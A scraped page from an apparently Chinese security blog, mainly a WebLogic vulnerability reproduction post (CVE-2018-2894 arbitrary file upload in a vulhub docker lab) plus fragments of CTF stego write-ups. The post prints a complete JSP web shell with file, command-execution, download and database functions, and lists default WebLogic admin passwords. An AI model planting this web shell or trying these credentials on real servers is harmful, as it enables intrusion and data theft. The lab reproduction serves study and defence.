<p>moectf{Learned_a6ou7_USB_tr@ffic}</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>











  
    <article id="post-weblogic漏洞复现" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a  href="/2024/07/21/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="article-date">
      <time datetime="2024-07-21T13:07:08.000Z" itemprop="datePublished">2024-07-21</time>
</a>

    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a  class="article-title" href="/2024/07/21/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">weblogic漏洞复现</a>
    </h1>
  


      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <span id="more"></span>

<h3 id="weblogic"><a href="#weblogic" class="headerlink" title="weblogic"></a>weblogic</h3><p>简介：</p>
<p>WebLogic是美国<a target="_blank" rel="noopener" href="http://lib.csdn.net/base/oracle">Oracle</a>公司出品的一个application server，确切的说是一个基于JAVAEE<a target="_blank" rel="noopener" href="http://lib.csdn.net/base/architecture">架构</a>的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和<a target="_blank" rel="noopener" href="http://lib.csdn.net/base/mysql">数据库</a>应用的<a target="_blank" rel="noopener" href="http://lib.csdn.net/base/java">Java</a>应用服务器。将Java的动态功能和<a target="_blank" rel="noopener" href="http://lib.csdn.net/base/java">Java </a>Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中</p>
<p><img src="/img/1721567330384-14.png" alt="img"></p>
<p>初始页面</p>
<p><img src="/img/1721567330382-4.png" alt="img"></p>
<p>这里推荐一个批量扫描脚本工具</p>
<p><a target="_blank" rel="noopener" href="https://github.com/rabbitmask/WeblogicScan">https://github.com/rabbitmask/WeblogicScan</a></p>
<h3 id="CVE-2018-2894"><a href="#CVE-2018-2894" class="headerlink" title="CVE-2018-2894"></a>CVE-2018-2894</h3><p>环境搭建：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">cd vulhub-master/weblogic/CVE-<span class="number">2018</span>-<span class="number">2894</span></span><br><span class="line">docker-compose up -d    <span class="comment">#docker上部署,关闭docker后再次访问直接输入即可</span></span><br><span class="line">docker ps   <span class="comment">#查看正在运行进程，发现其映射到7001端口</span></span><br><span class="line">http://<span class="number">192.168</span><span class="number">.228</span><span class="number">.131</span>:<span class="number">7001</span>/console/   <span class="comment">#访问7001，192.168.228.131是自己的主机名</span></span><br><span class="line">docker-compose down   <span class="comment">#复现之后记得销毁靶场，开启另一个靶场前要销毁前一个靶场</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/1721567330383-5.png" alt="img"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose logs | grep password  <span class="comment">#查看其密码为y9a03WHP</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/1721567330383-6.png" alt="img"></p>
<p>点击base_domain，点击advance处Enable Web Service Test Page，save保存</p>
<p><img src="/img/1721567330383-7.png" alt="img"></p>
<p><img src="/img/1721567330383-8.png" alt="img"></p>
<p>访问<a target="_blank" rel="noopener" href="http://your-ip:7001/ws_utc/config.do%EF%BC%8C%E8%AE%BE%E7%BD%AEWork">http://your-ip:7001/ws_utc/config.do，设置Work</a> Home Dir为<code>/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css</code>。我将目录设置为<code>ws_utc</code>应用的静态文件css目录，访问这个目录是无需权限的，这一点很重要。</p>
<p><img src="/img/1721567330383-9.png" alt="img"></p>
<p>点击安全 -&gt; 增加，然后上传1.jsp,进行bp抓包，我们可以发现时间戳<strong>1721315515880</strong></p>
<p><img src="/img/1721567330383-10.png" alt="img"></p>
<p>上传1.jsp获取其shell</p>
<p><img src="/img/1721567330384-11.png" alt="img"></p>
<p>蚁剑连接</p>
<p><img src="/img/1721567330384-12.png"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@page <span class="keyword">import</span>=<span class="string">&quot;java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*&quot;</span>%&gt;&lt;%!</span><br><span class="line">    String Pwd = <span class="string">&quot;Cknife&quot;</span>;</span><br><span class="line">    String cs = <span class="string">&quot;UTF-8&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    String EC(String s) throws Exception &#123;<span class="keyword">return</span> new String(s.getBytes(<span class="string">&quot;ISO-8859-1&quot;</span>),cs);&#125;</span><br><span class="line">    </span><br><span class="line">    Connection GC(String s) throws Exception &#123;</span><br><span class="line">        String[] x = s.trim().split(<span class="string">&quot;choraheiheihei&quot;</span>);</span><br><span class="line">        Class.forName(x[<span class="number">0</span>].trim());<span class="keyword">if</span>(x[<span class="number">1</span>].indexOf(<span class="string">&quot;jdbc:oracle&quot;</span>)!=-<span class="number">1</span>)&#123;<span class="keyword">return</span> DriverManager.getConnection(x[<span class="number">1</span>].trim()+<span class="string">&quot;:&quot;</span>+x[<span class="number">4</span>],x[<span class="number">2</span>].equalsIgnoreCase(<span class="string">&quot;[/null]&quot;</span>)?<span class="string">&quot;&quot;</span>:x[<span class="number">2</span>],x[<span class="number">3</span>].equalsIgnoreCase(<span class="string">&quot;[/null]&quot;</span>)?<span class="string">&quot;&quot;</span>:x[<span class="number">3</span>]);&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            Connection c = DriverManager.getConnection(x[<span class="number">1</span>].trim(),x[<span class="number">2</span>].equalsIgnoreCase(<span class="string">&quot;[/null]&quot;</span>)?<span class="string">&quot;&quot;</span>:x[<span class="number">2</span>],x[<span class="number">3</span>].equalsIgnoreCase(<span class="string">&quot;[/null]&quot;</span>)?<span class="string">&quot;&quot;</span>:x[<span class="number">3</span>]);<span class="keyword">if</span> (x.length &gt; <span class="number">4</span>) &#123;</span><br><span class="line">                c.setCatalog(x[<span class="number">4</span>]);&#125;<span class="keyword">return</span> c;&#125;&#125;void AA(StringBuffer sb) throws Exception &#123;</span><br><span class="line">        File k = new File(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        File r[] = k.listRoots();<span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; r.length; i++) &#123;</span><br><span class="line">            sb.append(r[i].toString().substring(<span class="number">0</span>, <span class="number">2</span>));&#125;&#125;void BB(String s, StringBuffer sb) throws Exception &#123;</span><br><span class="line">        File oF = new File(s), l[] = oF.listFiles();</span><br><span class="line">        String sT, sQ, sF = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        java.util.Date dt;</span><br><span class="line">        SimpleDateFormat fm = new SimpleDateFormat(<span class="string">&quot;yyyy-MM-dd HH:mm:ss&quot;</span>);<span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; l.length; i++) &#123;</span><br><span class="line">            dt = new java.util.Date(l[i].lastModified());</span><br><span class="line">            sT = fm.<span class="built_in">format</span>(dt);</span><br><span class="line">            sQ = l[i].canRead() ? <span class="string">&quot;R&quot;</span> : <span class="string">&quot;&quot;</span>;</span><br><span class="line">            sQ += l[i].canWrite() ? <span class="string">&quot; W&quot;</span> : <span class="string">&quot;&quot;</span>;<span class="keyword">if</span> (l[i].isDirectory()) &#123;</span><br><span class="line">                sb.append(l[i].getName() + <span class="string">&quot;/\t&quot;</span> + sT + <span class="string">&quot;\t&quot;</span> + l[i].length()+ <span class="string">&quot;\t&quot;</span> + sQ + <span class="string">&quot;\n&quot;</span>);&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                sF+=l[i].getName() + <span class="string">&quot;\t&quot;</span> + sT + <span class="string">&quot;\t&quot;</span> + l[i].length() + <span class="string">&quot;\t&quot;</span>+ sQ + <span class="string">&quot;\n&quot;</span>;&#125;&#125;</span><br><span class="line">        sb.append(sF);&#125;void EE(String s) throws Exception &#123;</span><br><span class="line">        File f = new File(s);<span class="keyword">if</span> (f.isDirectory()) &#123;</span><br><span class="line">            File x[] = f.listFiles();<span class="keyword">for</span> (<span class="built_in">int</span> k = <span class="number">0</span>; k &lt; x.length; k++) &#123;<span class="keyword">if</span> (!x[k].delete()) &#123;EE(x[k].getPath());&#125;&#125;&#125;</span><br><span class="line">        f.delete();&#125;void FF(String s, HttpServletResponse r) throws Exception &#123;</span><br><span class="line">        <span class="built_in">int</span> n;</span><br><span class="line">        byte[] b = new byte[<span class="number">512</span>];</span><br><span class="line">        r.reset();</span><br><span class="line">        ServletOutputStream os = r.getOutputStream();</span><br><span class="line">        BufferedInputStream <span class="keyword">is</span> = new BufferedInputStream(new FileInputStream(s));</span><br><span class="line">        os.write((<span class="string">&quot;-&gt;&quot;</span> + <span class="string">&quot;|&quot;</span>).getBytes(), <span class="number">0</span>, <span class="number">3</span>);<span class="keyword">while</span> ((n = <span class="keyword">is</span>.read(b, <span class="number">0</span>, <span class="number">512</span>)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            os.write(b, <span class="number">0</span>, n);&#125;</span><br><span class="line">        os.write((<span class="string">&quot;|&quot;</span> + <span class="string">&quot;&lt;-&quot;</span>).getBytes(), <span class="number">0</span>, <span class="number">3</span>);</span><br><span class="line">        os.close();<span class="keyword">is</span>.close();&#125;void GG(String s, String d) throws Exception &#123;</span><br><span class="line">        String h = <span class="string">&quot;0123456789ABCDEF&quot;</span>;</span><br><span class="line">        File f = new File(s);</span><br><span class="line">        f.createNewFile();</span><br><span class="line">        FileOutputStream os = new FileOutputStream(f);<span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; d.length(); i += <span class="number">2</span>) &#123;</span><br><span class="line">            os.write((h.indexOf(d.charAt(i)) &lt;&lt; <span class="number">4</span> | h.indexOf(d.charAt(i + <span class="number">1</span>))));&#125;</span><br><span class="line">        os.close();&#125;void HH(String s, String d) throws Exception &#123;</span><br><span class="line">        File sf = new File(s), df = new File(d);<span class="keyword">if</span> (sf.isDirectory()) &#123;<span class="keyword">if</span> (!df.exists()) &#123;</span><br><span class="line">                df.mkdir();&#125;</span><br><span class="line">            File z[] = sf.listFiles();<span class="keyword">for</span> (<span class="built_in">int</span> j = <span class="number">0</span>; j &lt; z.length; j++) &#123;HH(s + <span class="string">&quot;/&quot;</span> + z[j].getName(), d + <span class="string">&quot;/&quot;</span> + z[j].getName());&#125;&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            FileInputStream <span class="keyword">is</span> = new FileInputStream(sf);</span><br><span class="line">            FileOutputStream os = new FileOutputStream(df);</span><br><span class="line">            <span class="built_in">int</span> n;</span><br><span class="line">            byte[] b = new byte[<span class="number">512</span>];<span class="keyword">while</span> ((n = <span class="keyword">is</span>.read(b, <span class="number">0</span>, <span class="number">512</span>)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                os.write(b, <span class="number">0</span>, n);&#125;<span class="keyword">is</span>.close();</span><br><span class="line">            os.close();&#125;&#125;void II(String s, String d) throws Exception &#123;</span><br><span class="line">        File sf = new File(s), df = new File(d);</span><br><span class="line">        sf.renameTo(df);&#125;void JJ(String s) throws Exception &#123;</span><br><span class="line">        File f = new File(s);</span><br><span class="line">        f.mkdir();&#125;void KK(String s, String t) throws Exception &#123;</span><br><span class="line">        File f = new File(s);</span><br><span class="line">        SimpleDateFormat fm = new SimpleDateFormat(<span class="string">&quot;yyyy-MM-dd HH:mm:ss&quot;</span>);</span><br><span class="line">        java.util.Date dt = fm.parse(t);</span><br><span class="line">        f.setLastModified(dt.getTime());&#125;void LL(String s, String d) throws Exception &#123;</span><br><span class="line">        URL u = new URL(s);</span><br><span class="line">        <span class="built_in">int</span> n = <span class="number">0</span>;</span><br><span class="line">        FileOutputStream os = new FileOutputStream(d);</span><br><span class="line">        HttpURLConnection h = (HttpURLConnection) u.openConnection();</span><br><span class="line">        InputStream <span class="keyword">is</span> = h.getInputStream();</span><br><span class="line">        byte[] b = new byte[<span class="number">512</span>];<span class="keyword">while</span> ((n = <span class="keyword">is</span>.read(b)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            os.write(b, <span class="number">0</span>, n);&#125;</span><br><span class="line">        os.close();<span class="keyword">is</span>.close();</span><br><span class="line">        h.disconnect();&#125;void MM(InputStream <span class="keyword">is</span>, StringBuffer sb) throws Exception &#123;</span><br><span class="line">        String l;</span><br><span class="line">        BufferedReader br = new BufferedReader(new InputStreamReader(<span class="keyword">is</span>));<span class="keyword">while</span> ((l = br.readLine()) != null) &#123;</span><br><span class="line">            sb.append(l + <span class="string">&quot;\r\n&quot;</span>);&#125;&#125;void NN(String s, StringBuffer sb) throws Exception &#123;</span><br><span class="line">        Connection c = GC(s);</span><br><span class="line">        ResultSet r = s.indexOf(<span class="string">&quot;jdbc:oracle&quot;</span>)!=-<span class="number">1</span>?c.getMetaData().getSchemas():c.getMetaData().getCatalogs();<span class="keyword">while</span> (r.<span class="built_in">next</span>()) &#123;</span><br><span class="line">            sb.append(r.getString(<span class="number">1</span>) + <span class="string">&quot;\t|\t\r\n&quot;</span>);&#125;</span><br><span class="line">        r.close();</span><br><span class="line">        c.close();&#125;void OO(String s, StringBuffer sb) throws Exception &#123;</span><br><span class="line">        Connection c = GC(s);</span><br><span class="line">        String[] x = s.trim().split(<span class="string">&quot;choraheiheihei&quot;</span>);</span><br><span class="line">        ResultSet r = c.getMetaData().getTables(null,s.indexOf(<span class="string">&quot;jdbc:oracle&quot;</span>)!=-<span class="number">1</span>?x.length&gt;<span class="number">5</span>?x[<span class="number">5</span>]:x[<span class="number">4</span>]:null, <span class="string">&quot;%&quot;</span>, new String[]&#123;<span class="string">&quot;TABLE&quot;</span>&#125;);<span class="keyword">while</span> (r.<span class="built_in">next</span>()) &#123;</span><br><span class="line">            sb.append(r.getString(<span class="string">&quot;TABLE_NAME&quot;</span>) + <span class="string">&quot;\t|\t\r\n&quot;</span>);&#125;</span><br><span class="line">        r.close();</span><br><span class="line">        c.close();&#125;void PP(String s, StringBuffer sb) throws Exception &#123;</span><br><span class="line">        String[] x = s.trim().split(<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">        Connection c = GC(s);</span><br><span class="line">        Statement m = c.createStatement(<span class="number">1005</span>, <span class="number">1007</span>);</span><br><span class="line">        ResultSet r = m.executeQuery(<span class="string">&quot;select * from &quot;</span> + x[x.length-<span class="number">1</span>]);</span><br><span class="line">        ResultSetMetaData d = r.getMetaData();<span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">1</span>; i &lt;= d.getColumnCount(); i++) &#123;</span><br><span class="line">            sb.append(d.getColumnName(i) + <span class="string">&quot; (&quot;</span> + d.getColumnTypeName(i)+ <span class="string">&quot;)\t&quot;</span>);&#125;</span><br><span class="line">        r.close();</span><br><span class="line">        m.close();</span><br><span class="line">        c.close();&#125;void QQ(String cs, String s, String q, StringBuffer sb,String p) throws Exception &#123;</span><br><span class="line">        Connection c = GC(s);</span><br><span class="line">        Statement m = c.createStatement(<span class="number">1005</span>, <span class="number">1008</span>);</span><br><span class="line">        BufferedWriter bw = null;<span class="keyword">try</span> &#123;</span><br><span class="line">            ResultSet r = m.executeQuery(q.indexOf(<span class="string">&quot;--f:&quot;</span>)!=-<span class="number">1</span>?q.substring(<span class="number">0</span>,q.indexOf(<span class="string">&quot;--f:&quot;</span>)):q);</span><br><span class="line">            ResultSetMetaData d = r.getMetaData();</span><br><span class="line">            <span class="built_in">int</span> n = d.getColumnCount();<span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">                sb.append(d.getColumnName(i) + <span class="string">&quot;\t|\t&quot;</span>);&#125;</span><br><span class="line">            sb.append(<span class="string">&quot;\r\n&quot;</span>);<span class="keyword">if</span>(q.indexOf(<span class="string">&quot;--f:&quot;</span>)!=-<span class="number">1</span>)&#123;</span><br><span class="line">                File file = new File(p);<span class="keyword">if</span>(q.indexOf(<span class="string">&quot;-to:&quot;</span>)==-<span class="number">1</span>)&#123;</span><br><span class="line">                    file.mkdir();&#125;</span><br><span class="line">                bw = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(q.indexOf(<span class="string">&quot;-to:&quot;</span>)!=-<span class="number">1</span>?p.trim():p+q.substring(q.indexOf(<span class="string">&quot;--f:&quot;</span>) + <span class="number">4</span>,q.length()).trim()),true),cs));&#125;<span class="keyword">while</span> (r.<span class="built_in">next</span>()) &#123;<span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;<span class="keyword">if</span>(q.indexOf(<span class="string">&quot;--f:&quot;</span>)!=-<span class="number">1</span>)&#123;</span><br><span class="line">                        bw.write(r.getObject(i)+<span class="string">&quot;&quot;</span>+<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">                        bw.flush();&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        sb.append(r.getObject(i)+<span class="string">&quot;&quot;</span> + <span class="string">&quot;\t|\t&quot;</span>);&#125;&#125;<span class="keyword">if</span>(bw!=null)&#123;bw.newLine();&#125;</span><br><span class="line">                sb.append(<span class="string">&quot;\r\n&quot;</span>);&#125;</span><br><span class="line">            r.close();<span class="keyword">if</span>(bw!=null)&#123;bw.close();&#125;&#125; catch (Exception e) &#123;</span><br><span class="line">            sb.append(<span class="string">&quot;Result\t|\t\r\n&quot;</span>);<span class="keyword">try</span> &#123;</span><br><span class="line">                m.executeUpdate(q);</span><br><span class="line">                sb.append(<span class="string">&quot;Execute Successfully!\t|\t\r\n&quot;</span>);&#125; catch (Exception ee) &#123;</span><br><span class="line">                sb.append(ee.toString() + <span class="string">&quot;\t|\t\r\n&quot;</span>);&#125;&#125;</span><br><span class="line">        m.close();</span><br><span class="line">        c.close();&#125;%&gt;&lt;%//String Z = EC(request.getParameter(Pwd) + <span class="string">&quot;&quot;</span>, cs);</span><br><span class="line">    </span><br><span class="line">    cs = request.getParameter(<span class="string">&quot;code&quot;</span>) != null ? request.getParameter(<span class="string">&quot;code&quot;</span>)+ <span class="string">&quot;&quot;</span>:cs;</span><br><span class="line">    request.setCharacterEncoding(cs);</span><br><span class="line">    response.setContentType(<span class="string">&quot;text/html;charset=&quot;</span> + cs);</span><br><span class="line">    StringBuffer sb = new StringBuffer(<span class="string">&quot;&quot;</span>);<span class="keyword">if</span> (request.getParameter(Pwd) != null) &#123;<span class="keyword">try</span> &#123;</span><br><span class="line">        String Z = EC(request.getParameter(<span class="string">&quot;action&quot;</span>) + <span class="string">&quot;&quot;</span>);</span><br><span class="line">        String z1 = EC(request.getParameter(<span class="string">&quot;z1&quot;</span>) + <span class="string">&quot;&quot;</span>);</span><br><span class="line">        String z2 = EC(request.getParameter(<span class="string">&quot;z2&quot;</span>) + <span class="string">&quot;&quot;</span>);</span><br><span class="line">        sb.append(<span class="string">&quot;-&gt;&quot;</span> + <span class="string">&quot;|&quot;</span>);</span><br><span class="line">        String s = request.getSession().getServletContext().getRealPath(<span class="string">&quot;/&quot;</span>);<span class="keyword">if</span> (Z.equals(<span class="string">&quot;A&quot;</span>)) &#123;</span><br><span class="line">            sb.append(s + <span class="string">&quot;\t&quot;</span>);<span class="keyword">if</span> (!s.substring(<span class="number">0</span>, <span class="number">1</span>).equals(<span class="string">&quot;/&quot;</span>)) &#123;AA(sb);&#125;&#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;B&quot;</span>)) &#123;BB(z1, sb);&#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;C&quot;</span>)) &#123;</span><br><span class="line">            String l = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream(new File(z1))));<span class="keyword">while</span> ((l = br.readLine()) != null) &#123;</span><br><span class="line">                sb.append(l + <span class="string">&quot;\r\n&quot;</span>);&#125;</span><br><span class="line">            br.close();&#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;D&quot;</span>)) &#123;</span><br><span class="line">            BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(z1))));</span><br><span class="line">            bw.write(z2);</span><br><span class="line">            bw.close();</span><br><span class="line">            sb.append(<span class="string">&quot;1&quot;</span>);&#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;E&quot;</span>)) &#123;EE(z1);</span><br><span class="line">            sb.append(<span class="string">&quot;1&quot;</span>);&#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;F&quot;</span>)) &#123;FF(z1, response);&#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;G&quot;</span>)) &#123;GG(z1, z2);</span><br><span class="line">            sb.append(<span class="string">&quot;1&quot;</span>);&#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;H&quot;</span>)) &#123;HH(z1, z2);</span><br><span class="line">            sb.append(<span class="string">&quot;1&quot;</span>);&#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;I&quot;</span>)) &#123;II(z1, z2);</span><br><span class="line">            sb.append(<span class="string">&quot;1&quot;</span>);&#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;J&quot;</span>)) &#123;JJ(z1);</span><br><span class="line">            sb.append(<span class="string">&quot;1&quot;</span>);&#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;K&quot;</span>)) &#123;KK(z1, z2);</span><br><span class="line">            sb.append(<span class="string">&quot;1&quot;</span>);&#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;L&quot;</span>)) &#123;LL(z1, z2);</span><br><span class="line">            sb.append(<span class="string">&quot;1&quot;</span>);&#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;M&quot;</span>)) &#123;</span><br><span class="line">            String[] c = &#123; z1.substring(<span class="number">2</span>), z1.substring(<span class="number">0</span>, <span class="number">2</span>), z2 &#125;;</span><br><span class="line">            Process p = Runtime.getRuntime().<span class="built_in">exec</span>(c);MM(p.getInputStream(), sb);MM(p.getErrorStream(), sb);&#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;N&quot;</span>)) &#123;NN(z1, sb);&#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;O&quot;</span>)) &#123;OO(z1, sb);&#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;P&quot;</span>)) &#123;PP(z1, sb);&#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;Q&quot;</span>)) &#123;QQ(cs, z1, z2, sb,z2.indexOf(<span class="string">&quot;-to:&quot;</span>)!=-<span class="number">1</span>?z2.substring(z2.indexOf(<span class="string">&quot;-to:&quot;</span>)+<span class="number">4</span>,z2.length()):s.replaceAll(<span class="string">&quot;\\\\&quot;</span>, <span class="string">&quot;/&quot;</span>)+<span class="string">&quot;images/&quot;</span>);&#125;&#125; catch (Exception e) &#123;</span><br><span class="line">        sb.append(<span class="string">&quot;ERROR&quot;</span> + <span class="string">&quot;:// &quot;</span> + e.toString());&#125;</span><br><span class="line">    sb.append(<span class="string">&quot;|&quot;</span> + <span class="string">&quot;&lt;-&quot;</span>);</span><br><span class="line">    out.<span class="built_in">print</span>(sb.toString());&#125;%&gt;</span><br></pre></td></tr></table></figure>



<h3 id="weak-password"><a href="#weak-password" class="headerlink" title="weak_password"></a>weak_password</h3><p>漏洞详情：由于管理员的疏忽，有可能会设置一些弱口令，攻击者可以通过常见的口令猜解进入后台，再通过后台getshell</p>
<p>访问后台地址<a target="_blank" rel="noopener" href="http://your-ip:7001/console">http://your-ip:7001/console</a></p>
<p>常见的weblogic的口令</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">system:password</span><br><span class="line">weblogic:weblogic</span><br><span class="line">admin:secruity</span><br><span class="line">joe:password</span><br><span class="line">mary:password</span><br><span class="line">system:sercurity</span><br><span class="line">wlcsystem: wlcsystem</span><br><span class="line">weblogic:Oracle@<span class="number">123</span></span><br></pre></td></tr></table></figure>

<p>这里通过测试：weblogic:Oracle@123，成功登录</p>
<p><img src="/img/1721567330384-13.png" alt="img"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>











  
    <article id="post-DASCTF" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a  href="/2024/07/21/DASCTF/" class="article-date">
      <time datetime="2024-07-21T11:59:37.000Z" itemprop="datePublished">2024-07-21</time>
</a>

    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a  class="article-title" href="/2024/07/21/DASCTF/">DASCTF</a>
    </h1>
  


      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <span id="more"></span>

<h3 id="png-master"><a href="#png-master" class="headerlink" title="png_master"></a>png_master</h3><p>part1：010发现文件末尾有base64</p>
<p><img src="/img/1721568082484-37.png" alt="img"></p>
<p>cyberchef解密得</p>
<p>flag1:DASCTF{2fd9e9ff-e27</p>
<p>part2：stegsolve里发现</p>
<p><img src="/img/1721568082484-38.png" alt="img"></p>
<p>flag2：d-5405-c5f5-</p>
<p>part3：检查一下pngIDAT块的信息</p>
<p>关于IDAT隐写就在此处介绍一下</p>
<p>IDAT有<strong>固定的长度</strong>，正常的<strong>PNG图片</strong>只有最后一个IDAT块的长度是比其他的要短的，在此处很明显的58674是最后一个IDAT模块，但是后面仍然多了一个IDAT,这是多余的，可以用binwalk检测一下，其实我们可以发现他其实是有2个zlib，有几个zlib代表有几张png图片，可以浅浅的这样理解一下</p>
